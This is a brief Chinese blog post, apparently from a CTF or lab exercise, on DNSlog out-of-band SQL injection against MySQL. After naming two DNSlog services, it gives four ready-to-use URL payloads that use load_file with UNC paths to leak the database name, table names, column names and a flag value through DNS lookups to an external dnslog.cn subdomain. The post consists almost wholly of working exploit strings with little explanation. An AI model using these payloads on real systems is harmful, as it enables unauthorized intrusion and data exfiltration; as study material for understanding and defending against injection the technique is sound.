---
title: 记一次dnslog注入
tags: sql注入
categories: 技术分享
abbrlink: 9437e8fc
date: 2019-10-12 17:09:36
updated: 2019-10-12 17:09:36
---

DNSlog辅助平台

http://ceye.io 需注册

http://www.dnslog.cn/ 无需注册

#### 查库

```
http://www/index.php?id=1 and if((select load_file(concat('\\\\',(select database()),'.aksgyv.dnslog.cn\\abc'))),0,1)
```



#### 查表

```
http://www/index.php?id=1 and if((select load_file(concat('\\\\',(select group_concat(table_name) from information_schema.tables where table_schema='dnslog'),'.aksgyv.dnslog.cn\\abc'))),0,1)
```



#### 查列

```
http://www/index.php?id=1 and if((select load_file(concat('\\\\',(select group_concat(column_name)from information_schema.columns where table_name='flag_is_here'),'.aksgyv.dnslog.cn\\abc'))),0,1)
```



#### 查数据

```
http://www./index.php?id=1 and if((select load_file(concat('\\\\',(select flag from flag_is_here),'.aksgyv.dnslog.cn\\abc'))),0,1)
```

